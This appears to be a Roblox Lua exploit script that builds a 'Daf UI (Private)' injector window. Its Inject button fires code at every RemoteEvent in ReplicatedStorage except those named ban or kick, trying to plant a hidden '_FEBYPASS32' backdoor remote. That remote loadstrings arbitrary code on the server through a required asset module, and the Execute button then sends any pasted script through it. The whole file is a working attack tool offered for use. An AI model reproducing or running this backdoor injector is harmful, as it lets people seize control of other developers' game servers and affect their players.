local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local G2L = {}

G2L["ScreenGui"] = Instance.new("ScreenGui", playerGui)
G2L["ScreenGui"].Name = "DafUI"
G2L["ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
G2L["ScreenGui"].ResetOnSpawn = false

CollectionService:AddTag(G2L["ScreenGui"], "main")

local Frame = Instance.new("Frame", G2L["ScreenGui"])
Frame.Name = "MainFrame"
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderMode = Enum.BorderMode.Middle
Frame.Size = UDim2.new(0.24219, 0, 0.18868, 0)
Frame.Position = UDim2.new(0.39063, 0, 0.19137, 0)
Frame.Active = true
Frame.Draggable = true

local Title = Instance.new("TextLabel", Frame)
Title.Name = "Title"
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BorderMode = Enum.BorderMode.Middle
Title.Size = UDim2.new(0.99034, 0, 0.14184, 0)
Title.Position = UDim2.new(0, 0, -0.02857, 0)
Title.Text = "Daf UI (Private)"
Title.TextScaled = true
Title.TextWrapped = true
Title.Font = Enum.Font.SourceSansBold
Title.TextColor3 = Color3.fromRGB(0, 0, 0)

local Scriptbox = Instance.new("TextBox", Frame)
Scriptbox.Name = "Scriptbox"
Scriptbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Scriptbox.BorderMode = Enum.BorderMode.Middle
Scriptbox.ClearTextOnFocus = false
Scriptbox.Size = UDim2.new(0.88745, 0, 0.34041, 0)
Scriptbox.Position = UDim2.new(0.03871, 0, 0.28571, 0)
Scriptbox.Text = ""
Scriptbox.TextColor3 = Color3.fromRGB(0, 0, 0)
Scriptbox.Font = Enum.Font.Code
Scriptbox.TextWrapped = true
Scriptbox.MultiLine = true
Scriptbox.CursorPosition = -1

local Inject = Instance.new("TextButton", Frame)
Inject.Name = "Inject"
Inject.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Inject.BorderMode = Enum.BorderMode.Middle
Inject.Size = UDim2.new(0.25, 0, 0.21276, 0)
Inject.Position = UDim2.new(0.03871, 0, 0.65, 0)
Inject.Text = "Inject"
Inject.TextColor3 = Color3.fromRGB(0, 0, 0)
Inject.TextScaled = true
Inject.Font = Enum.Font.SourceSans

local Execute = Instance.new("TextButton", Frame)
Execute.Name = "Execute"
Execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Execute.BorderMode = Enum.BorderMode.Middle
Execute.Size = UDim2.new(0.3, 0, 0.21276, 0)
Execute.Position = UDim2.new(0.3, 0, 0.65, 0)
Execute.Text = "Execute"
Execute.TextColor3 = Color3.fromRGB(0, 0, 0)
Execute.TextScaled = true
Execute.Font = Enum.Font.SourceSans

local Clear = Instance.new("TextButton", Frame)
Clear.Name = "Clear"
Clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Clear.BorderMode = Enum.BorderMode.Middle
Clear.Size = UDim2.new(0.3, 0, 0.21276, 0)
Clear.Position = UDim2.new(0.63, 0, 0.65, 0)
Clear.Text = "Clear"
Clear.TextColor3 = Color3.fromRGB(0, 0, 0)
Clear.TextScaled = true
Clear.Font = Enum.Font.SourceSans

local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint", Frame)
UIAspectRatioConstraint.AspectRatio = 2.21429

Inject.MouseButton1Click:Connect(function()
	local function b_G_V12(see)
		local a = function(ree)
			ree:FireServer([[
				local folder = Instance.new('RemoteEvent')
				folder.Name = "_FEBYPASS32"
				folder.Parent = game:GetService("JointsService")
				local loadstring = require(13684410229)
				folder.OnServerEvent:Connect(function(_1,_2)
				   loadstring(_2)()
				end)
			]])
		end
		for i, v in pairs(see:GetChildren()) do
			if v:IsA("RemoteEvent") then
				if not string.match(string.lower(v.Name), "ban") and not string.match(string.lower(v.Name), "kick") then
					a(v)
				end
			end
			b_G_V12(v)
		end
	end
	b_G_V12(game:GetService("ReplicatedStorage"))
	local timetoken = 0
	local maxtime = 5
	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		Inject.Text = "Injected"
	end
end)

Execute.MouseButton1Click:Connect(function()
	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
		game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(Scriptbox.Text)
	else
		warn("Failed to loadstring: Error 404")
	end
end)

Clear.MouseButton1Click:Connect(function()
	Scriptbox.Text = ""
end)

return G2L["ScreenGui"]
